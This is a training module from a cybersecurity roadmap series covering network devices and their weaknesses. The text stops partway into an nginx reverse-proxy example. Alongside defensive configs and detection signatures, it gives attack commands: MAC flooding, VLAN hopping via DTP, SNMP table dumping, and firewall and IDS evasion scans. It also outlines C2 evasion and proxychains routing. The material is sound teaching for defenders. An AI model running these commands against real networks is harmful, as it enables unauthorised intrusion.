# Stage 1.6 — Network Devices
### From Zero to Cybersecurity Professional | Complete Roadmap Series

> **Series:** Cybersecurity × OT/ICS Security — Full Roadmap  
> **Stage:** 1 — Network Fundamentals  
> **Module:** 1.6 — Network Devices  
> **Level:** Beginner → Advanced  
> **Prerequisites:** Stage 1.5 — Core Protocols  
> **Next Module:** 1.7 — Wireless Networks

---

## Table of Contents

1. [Why Network Devices Are Both the Shield and the Target](#1-why-network-devices-are-both-the-shield-and-the-target)
2. [Hub, Switch, and Router — The Foundational Triad](#2-hub-switch-and-router--the-foundational-triad)
3. [Layer 2 vs Layer 3 Switch](#3-layer-2-vs-layer-3-switch)
4. [Firewall Types — Packet Filter to NGFW](#4-firewall-types--packet-filter-to-ngfw)
5. [IDS and IPS — Detection and Prevention](#5-ids-and-ips--detection-and-prevention)
6. [Proxy Servers](#6-proxy-servers)
7. [Load Balancers](#7-load-balancers)
8. [VPN Gateways](#8-vpn-gateways)
9. [WAF — Web Application Firewall](#9-waf--web-application-firewall)
10. [Modem vs Router](#10-modem-vs-router)
11. [Network Device Security — Cross-Cutting Concerns](#11-network-device-security--cross-cutting-concerns)
12. [Network Devices in OT/ICS Environments](#12-network-devices-in-otics-environments)
13. [Hands-On Exercises](#13-hands-on-exercises)
14. [Module Summary](#14-module-summary)

---

## 1. Why Network Devices Are Both the Shield and the Target

Every security control you deploy lives in a network device. Every firewall rule, every IDS signature, every VPN tunnel — they all depend on hardware and software that can itself be compromised, misconfigured, or bypassed. This dual nature — network devices as both defenders and targets — defines one of the most important and underappreciated attack surfaces in cybersecurity.

**Concrete attacks on network devices:**

**Cisco Smart Install Exploitation (2018):** The Cisco Smart Install protocol (TCP 4786), designed for zero-touch switch deployment, was left enabled on tens of thousands of internet-facing switches worldwide. The Talos Intelligence group documented a mass exploitation campaign where threat actors — including state-sponsored groups — scanned the entire internet for port 4786 and extracted running configurations from every vulnerable switch they found. Router configurations contain: all network topology, VLAN structure, access control lists, SNMP community strings, VPN credentials, and sometimes cleartext enable passwords. One protocol, left enabled by default, exposed the complete network architecture of thousands of organisations.

**SolarWinds SUNBURST (2020):** While not purely a network device attack, SUNBURST exploited network monitoring infrastructure (SolarWinds Orion) to move laterally. The lesson: the management plane of network devices — the systems used to monitor and configure them — is as critical as the devices themselves.

**F5 BIG-IP Vulnerability (CVE-2020-5902):** CVSS 10.0. The management interface of F5's load balancer/application delivery controller had an unauthenticated remote code execution vulnerability. Thousands of organisations use F5 BIG-IP to terminate TLS, balance traffic, and enforce WAF policies. Compromising it meant: decrypting all HTTPS traffic, bypassing all WAF rules, and gaining a position to intercept or modify all traffic through the device.

**For OT/ICS:** Industrial network switches are the backbone of substation automation, manufacturing floor networks, and SCADA architectures. Unmanaged switches cannot enforce VLANs. Managed switches with default SNMP community strings expose the entire OT topology. Firewalls between IT and OT with permissive rules are the reason Colonial Pipeline's operational network was affected by a ransomware attack that started in the corporate IT network.

The security mindset for this module: **Network devices are not passive infrastructure. They are active security controls that are themselves attack targets. Understanding how they work is prerequisite to understanding how they fail.**

---

## 2. Hub, Switch, and Router — The Foundational Triad

### 2.1 Hub — The Obsolete Broadcast Device

A hub is a Layer 1 (Physical Layer) device. It does no processing — it simply repeats every signal it receives on all ports simultaneously. Every device connected to a hub receives every frame sent by every other device.

```
HUB OPERATION:
                    ┌─────────────┐
PC-A sends frame → │     HUB     │ → All ports receive the frame
                   │             │
              ┌────┤  Port 1     ├────→ PC-A (sender, ignores)
              │    │  Port 2     ├────→ PC-B (receives)
              │    │  Port 3     ├────→ PC-C (receives)
              │    │  Port 4     ├────→ PC-D (receives)
              └────┤             │
                   └─────────────┘

Collision domain: ALL ports share one collision domain
Bandwidth: Shared among ALL devices (10 Mbps hub = 10 Mbps TOTAL)
```

**Why hubs matter for security:**
Hubs are functionally equivalent to having all network cables bundled together. Any NIC in promiscuous mode captures all traffic — including credentials from FTP, Telnet, HTTP, SMTP, and any other cleartext protocol. Wireshark on any hub-connected machine captures everything.

Hubs are largely extinct in enterprise IT but **still present in some legacy OT environments** — particularly older manufacturing floor networks and some building automation systems installed before managed switches became affordable.

**Security implication of finding a hub:**
If you find a hub during an OT assessment, any device connected to it can perform passive sniffing of all network traffic — including industrial protocol commands, HMI-to-PLC communications, and any cleartext credentials exchanged on that segment.

### 2.2 Switch — The Intelligent Frame Forwarder

A switch is a Layer 2 (Data Link Layer) device. Unlike a hub, a switch learns which MAC address is connected to which port and forwards frames only to the intended destination port.

```
SWITCH OPERATION:

MAC Address Table (CAM Table):
┌──────────────────┬──────┐
│ MAC Address      │ Port │
├──────────────────┼──────┤
│ AA:BB:CC:DD:EE:1 │  1   │ ← PC-A
│ AA:BB:CC:DD:EE:2 │  2   │ ← PC-B
│ AA:BB:CC:DD:EE:3 │  3   │ ← PC-C
│ AA:BB:CC:DD:EE:4 │  4   │ ← PC-D
└──────────────────┴──────┘

PC-A sends frame to PC-C:
  Switch looks up destination MAC → Port 3
  Frame forwarded ONLY to Port 3
  PC-B and PC-D receive nothing

First packet to unknown MAC:
  Switch floods to all ports (unknown unicast flooding)
  Learns source MAC from response → updates CAM table
```

**Switch Security Features:**

```
Port Security:
  Limits which MAC addresses can communicate on each port
  Maximum MAC addresses per port (default: 1)
  Violations: protect (drop), restrict (drop + log), shutdown (err-disable port)
  
  Cisco configuration:
  interface GigabitEthernet0/1
   switchport mode access
   switchport port-security maximum 2
   switchport port-security violation restrict
   switchport port-security mac-address sticky    ← learn and remember MACs automatically
   switchport port-security

802.1X Port Authentication:
  Device must authenticate BEFORE receiving network access
  Authentication via RADIUS server
  EAP (Extensible Authentication Protocol) variants: EAP-TLS, PEAP
  Prevents rogue device connection to physical port
  
  Cisco: dot1x system-auth-control
         interface gi0/1: dot1x port-control auto

DHCP Snooping:
  Validates DHCP packets against trusted/untrusted port designation
  Only uplinks to legitimate DHCP server are "trusted"
  Drops DHCP OFFER/ACK from untrusted ports (blocks rogue DHCP)
  Builds binding table: {IP, MAC, port, VLAN}
  
Dynamic ARP Inspection (DAI):
  Validates ARP packets against DHCP snooping binding table
  Drops ARP packets where IP-MAC doesn't match binding table
  Prevents ARP poisoning/spoofing

Storm Control:
  Rate-limits broadcast, multicast, unknown unicast traffic
  Prevents broadcast storms from overwhelming network
  Mitigates some DoS attacks

Private VLANs:
  Isolated ports: can only communicate with promiscuous port (uplink)
  Community ports: communicate with each other and promiscuous port
  Use case: hotel rooms, guest WiFi — clients cannot attack each other
```

**Switch Attack Techniques:**

```bash
# MAC Flooding — overflow CAM table, force hub behaviour:
sudo macof -i eth0                     # macof from dsniff package
# Generates ~155,000 frames/second with random MACs
# CAM table fills → switch floods all traffic → passive sniffing possible
# Modern switches: storm control, port security prevent this

# VLAN Hopping — access restricted VLANs:
# Method 1: DTP negotiation (if port is in dynamic mode)
# Yersinia: yersinia -G → DTP attacks → Enable trunking
sudo yersinia dtp -attack 1           # Send DTP frames to negotiate trunk

# Method 2: Double tagging (attacker on native VLAN)
# Requires: attacker is on native VLAN of a trunk port
# Frame: [Outer Tag: native VLAN][Inner Tag: target VLAN][payload]
# Tools: scapy to craft double-tagged frames

# Detection:
# Unusual trunk negotiations from access ports
# Multiple VLANs appearing on access ports
# switch log: %DTP-5-TRUNKPORTON — unexpected trunk negotiation

# View CAM table remotely (if SNMP community known):
snmpwalk -v2c -c public switch_ip 1.3.6.1.2.1.17.7.1.2.2
# Returns: VLAN, MAC address, port number — full MAC table
```

### 2.3 Router — The Inter-Network Forwarder

A router is a Layer 3 (Network Layer) device. It forwards packets between different networks based on IP destination addresses and a routing table.

```
ROUTER OPERATION:

                Network A (192.168.1.0/24)         Network B (10.0.0.0/8)
                        │                                   │
PC: 192.168.1.5 ───────┤                                   ├─── Server: 10.0.0.1
                        │     ROUTER                        │
                        │  ┌──────────────────────┐         │
                        └──┤ eth0: 192.168.1.1/24  │         │
                           │ eth1: 10.0.0.254/8   ├─────────┘
                           │                       │
                           │  Routing Table:       │
                           │  10.0.0.0/8 → eth1   │
                           │  192.168.1.0/24 → eth0│
                           │  0.0.0.0/0 → ISP      │
                           └──────────────────────┘

Packet from 192.168.1.5 to 10.0.0.1:
  1. Arrives on eth0 (L2 stripped)
  2. Router checks: destination 10.0.0.1 → matches 10.0.0.0/8 → eth1
  3. Router decrements TTL (64 → 63)
  4. Router performs ARP for 10.0.0.1 (or next-hop)
  5. Creates new L2 frame with router's MAC as source
  6. Forwards out eth1
```

**Hub vs Switch vs Router Comparison:**

```
Characteristic    Hub              Switch           Router
─────────────────────────────────────────────────────────────────────────
OSI Layer         1 (Physical)     2 (Data Link)    3 (Network)
Addressing        None             MAC addresses    IP addresses
Forwarding        All ports        Destination port  Next hop (routing table)
Broadcast domain  Shared           Shared           Separate per interface
Collision domain  Shared           Per port         Per interface
Traffic isolation None             Per port         Per network
Sniffing risk     Any connected    Requires MITM    Between networks only
Speed             Shared           Full duplex      Dependent on routing
Security features None             Port security,   ACLs, routing policy
                                   802.1X, DAI      
OT presence       Legacy (risk)    Dominant         Zone boundary
```

> **Key Insight:** Switches replaced hubs specifically because hub behaviour — flooding all traffic to all ports — is a passive sniffing vulnerability by design. But switches are not immune: MAC flooding reverts switch behaviour to hub behaviour. The presence of an unmanaged switch (one that cannot enforce port security or DHCP snooping) in a security-sensitive environment has security implications equivalent to a hub.

---

## 3. Layer 2 vs Layer 3 Switch

### 3.1 The Distinction

**Layer 2 Switch:** Forwards frames based purely on MAC addresses. Cannot route between subnets. All ports are in the same routing domain — inter-VLAN communication requires an external router.

**Layer 3 Switch (Multilayer Switch):** Has the forwarding capability of a Layer 2 switch PLUS routing capability. Can route between VLANs internally using a routing engine. Faster than using a separate router for inter-VLAN traffic because routing is done in ASIC hardware rather than software.

```
INTER-VLAN ROUTING COMPARISON:

Router-on-a-Stick (L2 Switch + External Router):
  ┌─────────┐  trunk  ┌─────────┐
  │  L2 SW  ├─────────┤ Router  │
  │ VLAN 10 │         │ 10.0.0.1│  (sub-interfaces per VLAN)
  │ VLAN 20 │         │ 20.0.0.1│
  └─────────┘         └─────────┘
  All inter-VLAN traffic must traverse router link
  Bottleneck: single physical link, router CPU
  
Layer 3 Switch (SVIs — Switched Virtual Interfaces):
  ┌──────────────────────┐
  │     L3 SWITCH        │
  │ SVI VLAN10: 10.0.0.1 │  ← Virtual interface for VLAN 10
  │ SVI VLAN20: 20.0.0.1 │  ← Virtual interface for VLAN 20
  │                      │
  │ Internal routing at  │
  │ hardware speed       │
  └──────────────────────┘
  Inter-VLAN routing: wire-speed (Gbps)
  No bottleneck: routing in silicon
```

### 3.2 Security Implications of L3 Switches

**ACLs on L3 switches vs firewalls:**

L3 switches can enforce ACLs (Access Control Lists) at line rate. This makes them valuable for:
- Blocking traffic between VLANs (even when routing between them)
- Rate-limiting specific traffic types
- Dropping known malicious traffic at the distribution layer

However, L3 switch ACLs are NOT a substitute for firewalls:
- No stateful inspection (cannot track TCP connection state)
- No application awareness
- No deep packet inspection
- No logging as sophisticated as dedicated firewalls
- No NAT capability typically

```bash
# View L3 switch routing table (Cisco IOS):
show ip route                          # Full routing table
show ip route summary                  # Summary with counts
show ip route 10.10.2.0               # Route to specific network

# View SVIs (switched virtual interfaces):
show interfaces vlan 10               # Status of VLAN 10 SVI
show ip interface brief | include Vlan  # All SVIs and their IPs

# ACL on L3 switch:
# Create ACL:
ip access-list extended BLOCK_USERS_TO_OT
 deny ip 10.10.1.0 0.0.0.255 10.20.0.0 0.0.0.255  # Block users → OT
 permit ip any any

# Apply to SVI (inbound on User VLAN):
interface Vlan10
 ip access-group BLOCK_USERS_TO_OT in

# Verify ACL:
show ip access-lists BLOCK_USERS_TO_OT
show interfaces vlan10 | include access list

# Monitor ACL hits:
show ip access-lists BLOCK_USERS_TO_OT
# "matches" count increases when traffic hits the rule
```

**L3 Switches in OT Environments:**

Many industrial network designs use a single L3 switch as both the distribution switch AND the router between zones. This simplifies hardware but concentrates security risk:
- One device compromise → routing control for all zones
- ACLs on the L3 switch may be the only segmentation between OT zones
- L3 switch firmware vulnerabilities affect routing security directly

> **Key Insight:** A Layer 3 switch is a router built into a switch. The routing decisions happen in hardware (ASIC) rather than software, making inter-VLAN routing 10-100× faster than a software router. In security architecture, L3 switches provide efficient inter-VLAN routing with ACL enforcement but cannot replace firewalls for stateful inspection and application-layer control.

---

## 4. Firewall Types — Packet Filter to NGFW

### 4.1 Firewall Evolution

Firewalls have evolved through five generations, each adding capability — and attack surface. Understanding each generation explains why modern firewalls are complex and why older configurations leave gaps.

### 4.2 Generation 1 — Packet Filter (Stateless)

The original firewall. Examines each packet independently against a ruleset. Makes decisions based on:
- Source IP address
- Destination IP address
- Source port
- Destination port
- Protocol (TCP/UDP/ICMP)

```
Packet Filter Rule Example (iptables):
iptables -A INPUT -s 0.0.0.0/0 -d 192.168.1.100 -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -j DROP

# This rule:
# -A INPUT: append to INPUT chain
# -s 0.0.0.0/0: from any source
# -d 192.168.1.100: to this specific destination
# -p tcp: TCP protocol
# --dport 80: destination port 80 (HTTP)
# -j ACCEPT: allow the packet
```

**Fundamental Weakness — No State:**

A packet filter sees each packet in isolation. It cannot distinguish between:
- A TCP SYN starting a new connection (legitimate)
- A TCP ACK with no corresponding SYN (forged packet)
- A response to an established connection vs an unsolicited packet

**ACK Scan bypass:** If the firewall allows TCP port 80 inbound:
- A legitimate SYN to port 80 → ALLOWED ✓ (starts HTTP connection)
- An attacker's ACK to port 80 → ALSO ALLOWED (firewall sees allowed port, can't check if connection established)
- The TCP stack on the target will RST the ACK, but the attacker now knows the host responds

### 4.3 Generation 2 — Stateful Inspection

Stateful firewalls track the state of network connections in a state table. They remember which connections have been established and allow only packets that match an existing connection state.

```
Connection State Table:
┌──────────────────┬─────────────────┬──────────┬───────────┬──────────┐
│ Src IP:Port      │ Dst IP:Port     │ Protocol │ State     │ Timeout  │
├──────────────────┼─────────────────┼──────────┼───────────┼──────────┤
│ 192.168.1.5:54321│ 8.8.8.8:53      │ UDP      │ RELATED   │ 30s      │
│ 192.168.1.10:49000│ 93.184.216.34:80│ TCP     │ ESTABLISHED│ 3600s   │
│ 10.0.0.1:51234  │ 192.168.1.100:22│ TCP      │ ESTABLISHED│ 3600s   │
└──────────────────┴─────────────────┴──────────┴───────────┴──────────┘

Inbound packet: 8.8.8.8:53 → 192.168.1.5:54321 (DNS response)
  Firewall checks state table → finds matching entry → ALLOW (response to existing connection)

Inbound packet: 1.2.3.4:4444 → 192.168.1.5:54321 (unsolicited)
  Firewall checks state table → no matching entry → DROP
```

**Stateful Firewall Limitations:**

- No application awareness (allowed port 80 traffic can carry any application data)
- State table exhaustion attacks: send many half-open connections to fill state table
- Long-lived UDP connections: UDP is stateless, firewall must infer "connection" from traffic patterns
- Application layer attacks invisible (SQLi, XSS, malware in HTTP payload)

### 4.4 Generation 3 — Application Layer Gateway (ALG)

Application-aware firewalls understand specific protocols and can inspect application layer content. Examples:
- FTP ALG: understands PORT/PASV commands, opens dynamic ports for data connections
- SIP ALG: understands VoIP signalling, tracks call state
- DNS ALG: inspects DNS responses for anomalies

ALGs introduce their own vulnerabilities — FTP ALG bugs have been exploited to traverse firewalls.

### 4.5 Generation 4 — Next-Generation Firewall (NGFW)

NGFW (term coined by Palo Alto Networks, 2007) combines:

```
NGFW Capabilities:
┌────────────────────────────────────────────────────────────────────┐
│  Application Identification (App-ID)                               │
│  Identifies application regardless of port (Facebook over TCP 80)  │
│  Policy: Allow web browsing, block BitTorrent, even on same port   │
├────────────────────────────────────────────────────────────────────┤
│  User Identification (User-ID)                                     │
│  Ties traffic to specific users (via AD/LDAP integration)          │
│  Policy: "Allow IT staff to use SSH, block other users"            │
├────────────────────────────────────────────────────────────────────┤
│  SSL/TLS Inspection                                                │
│  Decrypts HTTPS traffic, inspects content, re-encrypts            │
│  Detects malware and data exfiltration in encrypted traffic        │
│  Privacy consideration: firewall sees all decrypted content        │
├────────────────────────────────────────────────────────────────────┤
│  Intrusion Prevention System (IPS)                                 │
│  Signature-based and behavioural threat detection                  │
│  Can block exploits, malware C2 traffic                            │
├────────────────────────────────────────────────────────────────────┤
│  URL Filtering / Web Categories                                    │
│  Block access to malicious, inappropriate, or prohibited sites     │
├────────────────────────────────────────────────────────────────────┤
│  Threat Intelligence Integration                                   │
│  Block known malicious IPs/domains from threat feed               │
├────────────────────────────────────────────────────────────────────┤
│  Sandboxing                                                        │
│  Execute suspicious files in isolated environment, detect malware  │
└────────────────────────────────────────────────────────────────────┘
```

**NGFW Vulnerabilities — The High-Value Target:**

Because NGFWs sit inline with all traffic and have TLS decryption keys, they are extremely high-value attack targets.

```
CVE-2024-3400 (Palo Alto PAN-OS, April 2024):
  CVSS: 10.0 — Critical
  Component: GlobalProtect gateway (VPN)
  Impact: Unauthenticated Remote Code Execution as root
  Affected: PAN-OS 10.2, 11.0, 11.1 with GlobalProtect enabled
  Real-world exploitation: Volexity confirmed active exploitation by
  nation-state actor (UTA0218 — likely Volt Typhoon/Chinese APT)
  attacker used to: establish reverse shells, deploy backdoors,
  pivot to internal network
  Lesson: The firewall designed to protect the network became the
  entry point. Remote management interfaces and VPN gateways
  on NGFWs are prime targets.

CVE-2022-1388 (F5 BIG-IP iControl REST, May 2022):
  CVSS: 9.8 — Critical  
  Unauthenticated iControl REST endpoint allowed authentication bypass
  Attacker could execute arbitrary commands as root
  Within 48 hours of disclosure: mass exploitation observed globally

CVE-2020-5902 (F5 BIG-IP TMUI, July 2020):
  CVSS: 10.0
  Unauthenticated RCE on the Traffic Management User Interface
  BIG-IP handles load balancing + TLS termination + WAF for major enterprises
  Attackers accessed: SSL private keys, WAF bypass, lateral movement

Fortinet FortiOS SSL-VPN vulnerabilities (recurring):
  CVE-2022-42475: Heap overflow in SSL-VPN → RCE
  CVE-2023-27997: Pre-auth heap overflow → RCE
  Multiple Chinese APT campaigns specifically targeted Fortinet devices
```

**Firewall Rule Analysis:**

```bash
# Linux iptables — view current rules:
sudo iptables -L -n -v              # All chains, numeric, verbose
sudo iptables -L -n -v --line-numbers  # With line numbers for modification
sudo iptables -t nat -L -n -v       # NAT table
sudo iptables -S                    # Exact rule syntax (can be used to rebuild)

# nftables (modern Linux firewall):
sudo nft list ruleset               # Full ruleset
sudo nft list table inet filter     # Specific table

# Test firewall rules (hping3 — craft specific packets):
sudo hping3 -S -p 80 target_ip     # TCP SYN to port 80 — is it open?
sudo hping3 -A -p 80 target_ip     # TCP ACK to port 80 — stateless fw bypass?
sudo hping3 -F -p 80 target_ip     # TCP FIN — FIN scan
sudo hping3 --udp -p 53 target_ip  # UDP to port 53

# Nmap firewall analysis:
sudo nmap -sA -p 80 target_ip      # ACK scan — map firewall rules
# Open/closed: unfiltered (stateless fw may allow ACK)
# No response: filtered (stateful fw drops unexpected ACK)

sudo nmap -sF -p 80 target_ip      # FIN scan — some firewalls don't block FIN
sudo nmap -sS --mtu 8 target_ip    # Fragmented SYN — bypass some IDS

# Check for firewall evasion via fragmentation:
sudo nmap -sS -f target_ip         # 8-byte fragments
sudo nmap -sS --mtu 24 target_ip   # 24-byte fragments
sudo nmap -sS -D RND:5 target_ip   # Decoy scan (5 fake IPs)

# Identify firewall type from responses:
sudo nmap --traceroute --script firewall-bypass target_ip
```

**Firewall DMZ Architecture:**

```
PROPER DMZ DESIGN:

Internet ──→ [External Firewall] ──→ DMZ ──→ [Internal Firewall] ──→ Internal LAN
                                      │
                               Web Server  Mail Server  DNS Server
                               
Rules:
  External FW → DMZ:
    ALLOW: TCP 80, 443 to web server
    ALLOW: TCP 25 to mail server
    ALLOW: UDP 53 to DNS server
    DENY: all else
    
  DMZ → Internal FW:
    ALLOW: TCP 1433 from web server to DB server only
    ALLOW: TCP 389 from mail server to LDAP only
    DENY: all else
    
  Internal → External FW:
    ALLOW: TCP 80, 443 outbound (web browsing)
    ALLOW: UDP 53 to corporate DNS
    DENY: direct internet access on other ports

A compromised web server in DMZ:
  Can reach: only database server on specific port
  Cannot reach: workstations, other servers, domain controllers
  Lateral movement is restricted by design
```

> **Key Insight:** NGFWs are the most powerful network security devices available — and they are the highest-value targets for sophisticated attackers. A compromised NGFW gives the attacker everything: TLS decryption keys, network topology visibility, the ability to bypass all inspection, and a position inline with all traffic. Every NGFW must be treated as critical infrastructure: hardened, monitored, and patched with the same urgency as domain controllers.

---

## 5. IDS and IPS — Detection and Prevention

### 5.1 The Difference

**IDS (Intrusion Detection System):** Monitors network traffic or host activity and ALERTS on suspicious patterns. It does not block traffic — it is a passive observer that generates alerts for security analysts to investigate.

**IPS (Intrusion Prevention System):** Deployed inline with traffic. Inspects every packet and can DROP, RESET, or MODIFY traffic in real time. If an IPS fails open (fails to block), traffic passes. If it fails closed, the network stops.

```
IDS DEPLOYMENT (passive):
  Network traffic → ┬────────────────────→ Destination
                    └──→ [IDS] → Alerts → SIEM/SOC
  
  TAP or SPAN port copies traffic to IDS
  IDS reads copy — original traffic unaffected
  No latency impact
  Cannot block threats

IPS DEPLOYMENT (inline):
  Network traffic → [IPS] → Destination
                     ↓
                   Block/Alert/Log
  
  All traffic passes through IPS
  IPS can block, drop, or modify packets
  Adds latency (typically <1ms on modern hardware)
  High availability required (bypass mode if IPS fails)
```

### 5.2 Detection Methods

**Signature-Based Detection:**
Matches traffic against a database of known attack patterns (signatures). Fast and precise for known attacks. Completely blind to novel (zero-day) attacks.

```
Example signatures (Snort format):
# Detect EternalBlue SMB exploit:
alert tcp any any -> any 445 (msg:"ET EXPLOIT Possible EternalBlue MS17-010"; \
    content:"|00 00 00 31|"; depth:4; content:"|ff|SMB2"; within:8; \
    sid:2024217; rev:1;)

# Detect Mimikatz credential dumping via network:
alert tcp any any -> any any (msg:"CREDENTIAL DUMP Possible Mimikatz"; \
    content:"sekurlsa"; nocase; sid:9000001; rev:1;)

# Detect SQL injection attempt:
alert tcp any any -> any 80 (msg:"SQL Injection Attempt"; \
    content:"UNION SELECT"; nocase; http_uri; sid:9000002; rev:1;)
```

**Anomaly-Based Detection:**
Establishes a baseline of "normal" behaviour and alerts when traffic deviates significantly. Can detect novel attacks. High false positive rate — every legitimate deviation generates an alert.

```
Anomaly detection examples:
  - DNS query volume per host: baseline = 100/hour, alert > 1000/hour
    (potential DNS tunnelling)
  - Outbound connections per host: baseline = 50/day, alert > 500/day
    (potential malware C2)
  - Data transferred per session: baseline = 1MB, alert > 100MB
    (potential data exfiltration)
  - Login failures per account: baseline = 0/hour, alert > 10/hour
    (brute force attack)
  - New external IP contacted: alert on first connection to never-seen IP
    (potential malware beacon)
```

**Behavioural/Heuristic Detection:**
Analyses sequences of events rather than individual packets. Detects attack patterns that span multiple packets or sessions.

```
Example behavioural rule:
  IF: host performs port scan (>50 unique ports in 60 seconds)
  AND: then connects to port 445 on a discovered host
  AND: then sends SMB traffic with specific byte patterns
  THEN: alert "Possible EternalBlue propagation attempt"
  
Individual events might be benign. The SEQUENCE is the indicator.
```

### 5.3 Snort and Suricata

**Snort** (2005, Cisco) and **Suricata** (2010, OISF) are the dominant open-source IDS/IPS engines.

```bash
# Install Snort on Ubuntu:
sudo apt install snort

# Basic Snort rule syntax:
# action proto src_ip src_port direction dst_ip dst_port (options)
# alert tcp 192.168.1.0/24 any -> any 445 (msg:"SMB Connection"; sid:1000001;)

# Run Snort in IDS mode (alert only):
sudo snort -A console -q -c /etc/snort/snort.conf -i eth0
# -A console: output alerts to console
# -q: quiet (no banner)
# -c: config file
# -i: interface

# Run Snort on a pcap file (useful for analysis without live traffic):
sudo snort -A console -q -c /etc/snort/snort.conf -r capture.pcap

# Install Suricata:
sudo apt install suricata

# Update Suricata rules (uses ET Open ruleset):
sudo suricata-update

# Run Suricata in IDS mode:
sudo suricata -c /etc/suricata/suricata.yaml -i eth0

# Run in IPS mode (requires nfqueue):
sudo iptables -I FORWARD -j NFQUEUE --queue-num 0
sudo suricata -c /etc/suricata/suricata.yaml -q 0
# All forwarded traffic → queue 0 → Suricata → allow/drop

# View Suricata alerts (JSON format):
sudo tail -f /var/log/suricata/eve.json | python3 -m json.tool

# Write a custom Suricata rule:
cat > /etc/suricata/rules/local.rules << 'EOF'
# Alert on connection to known Metasploit default port
alert tcp $HOME_NET any -> any 4444 (msg:"Possible Metasploit Listener"; \
    flow:established,to_server; sid:9999001; rev:1;)

# Alert on large DNS TXT responses (DNS tunnelling indicator)
alert dns any any -> any any (msg:"Large DNS TXT Response - Possible Tunnel"; \
    dns.type:response; dns.rrtype:TXT; \
    byte_test:2,>,200,0,relative; \
    sid:9999002; rev:1;)
EOF

sudo systemctl restart suricata
```

### 5.4 IDS Evasion Techniques

Understanding evasion is essential both for offensive assessments and for improving defensive detections.

```bash
# Fragmentation evasion:
# Split attack payload across multiple small IP fragments
# Some IDS inspect fragments individually, miss attack that only appears after reassembly
sudo nmap -sS -f target_ip              # 8-byte fragments
sudo nmap -sS --mtu 16 target_ip       # 16-byte fragments

# Low-and-slow evasion:
# Spread attack over long time to avoid volume-based detection
sudo nmap -T0 target_ip                # Paranoid timing — one packet every 5 minutes
# Baseline: "50 unique ports per minute" → T0 evades this threshold

# Protocol confusion:
# Use non-standard protocol fields to confuse IDS
# TTL manipulation: send two packets to same port
# Packet 1: TTL=1 (dies at first hop, IDS sees it but target doesn't)
# Packet 2: TTL=128 (reaches target)
# IDS may reassemble including Packet 1, target only processes Packet 2
# Result: IDS sees different data than target processes

# Encrypted channels:
# Use HTTPS, TLS, SSH tunnels for C2
# IDS without TLS inspection is blind to encrypted payload
# Cobalt Strike, Covenant C2 use HTTPS beaconing for this reason

# Polymorphic shellcode:
# Shellcode that changes its signature with each generation
# Signature-based IDS cannot match a pattern that changes
# XOR encoding, RC4 encryption of payload at different keys each run

# Protocol mimicry:
# Make C2 traffic look like legitimate protocol traffic
# Cobalt Strike "Malleable C2 profiles" make beacon traffic look like
# Google Analytics, Amazon CloudFront, or any web service
```

**IPS Bypass — The False Positive Problem:**

```
IPS bypass via false positive exploitation:
  If IPS blocks traffic matching signature X
  Attacker sends traffic that triggers signature X against legitimate servers
  IPS starts blocking legitimate servers from communicating
  Defenders disable the rule to restore service
  Attacker then uses the attack technique freely

This is a known attack against IPS deployments.
Well-tuned false positive rates are a security requirement, not just operational.
```

> **Key Insight:** An IDS that generates thousands of alerts per day is effectively useless — no human can investigate them all. Alert fatigue causes analysts to ignore or dismiss alerts, missing the real attacks buried in the noise. Tuning the IDS to minimise false positives while maintaining detection of high-priority attacks is one of the most important and most neglected security engineering tasks.

---

## 6. Proxy Servers

### 6.1 Forward Proxy — Outbound Traffic Control

A forward proxy sits between clients and the internet. Clients send requests to the proxy; the proxy forwards them to the destination on behalf of the client.

```
WITHOUT PROXY:
  Client → Direct connection → Internet destination
  Destination sees: client's real IP
  Administrator sees: nothing (traffic bypasses corporate infrastructure)

WITH FORWARD PROXY:
  Client → Proxy → Internet destination
  Destination sees: proxy's IP (client IP hidden)
  Proxy logs: who requested what, when, response size
  Administrator can: enforce content filtering, scan for malware, decrypt TLS
```

**Forward Proxy Security Functions:**

```
Content Filtering:
  Block access to categories: malware, adult, gaming, social media
  Block specific domains or URLs
  Block file types (.exe, .js, .ps1 downloads)
  
URL Reputation:
  Check destination URL against threat intelligence feeds
  Block connections to known malicious domains
  Detect connections to DGA (Domain Generation Algorithm) domains
  
TLS Inspection:
  Client → [TLS to proxy] → Proxy decrypts → [TLS to destination]
  Proxy sees plaintext, can inspect for malware/exfiltration
  Requires installing proxy's CA certificate as trusted in all clients
  
Bandwidth Control:
  Rate-limit streaming services
  Throttle large downloads
  
Authentication:
  Require users to authenticate before internet access
  Tie internet access to user identity (NTLM, Kerberos, LDAP)
  
Malware Scanning:
  Scan downloaded files in real-time with antivirus
  Sandbox suspicious files before delivering to client
```

**Proxy Security Implications — Attacking Through Proxies:**

```bash
# C2 traffic designed to evade proxy:
# 1. Use HTTPS (proxy without TLS inspection is blind)
# 2. Communicate to legitimate domains (Google Docs, GitHub, Slack)
#    as dead-drops for C2 instructions
# 3. Domain fronting: use legitimate CDN as the visible destination,
#    actually communicate with attacker backend

# Configure proxy for curl (common in post-exploitation):
export http_proxy="http://proxy.company.com:8080"
export https_proxy="http://proxy.company.com:8080"
curl https://example.com

# Bypass proxy for specific destinations:
export no_proxy="10.0.0.0/8,192.168.0.0/16,localhost"

# Proxychains — route tool traffic through proxy chain:
# /etc/proxychains.conf:
# socks5 127.0.0.1 9050    ← Tor
# socks5 192.168.1.100 1080 ← SSH SOCKS proxy
proxychains nmap -sT target_ip     # Proxied Nmap
proxychains curl http://target/    # Proxied curl

# Detect proxy in environment:
env | grep -i proxy                    # Check proxy environment variables
cat /etc/environment | grep -i proxy  # System-wide proxy
cat /etc/apt/apt.conf.d/proxy.conf    # APT proxy
```

### 6.2 Reverse Proxy — Inbound Traffic Control

A reverse proxy sits in front of servers. External clients connect to the reverse proxy; the reverse proxy forwards requests to backend servers. Clients see only the reverse proxy's IP.

```
WITHOUT REVERSE PROXY:
  Internet → Direct connection → Web Server (IP exposed)
  Attacker can: directly target web server IP
  DDoS: send attack directly to server
  
WITH REVERSE PROXY:
  Internet → Reverse Proxy → Web Server(s) (IP hidden)
  Attacker sees: only reverse proxy IP
  Web server IP: hidden, protected
  Reverse proxy provides: TLS termination, load balancing, WAF, DDoS protection
```

**Nginx as Reverse Proxy:**

```nginx
# /etc/nginx/sites-available/reverse_proxy
server {
    listen 443 ssl;
    server_name app.company.com;
    
    # TLS configuration
    ssl_certificate /etc/ssl/certs/company.crt;
    ssl_certificate_key /etc/ssl/private/company.key;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256;
    
    # Security headers
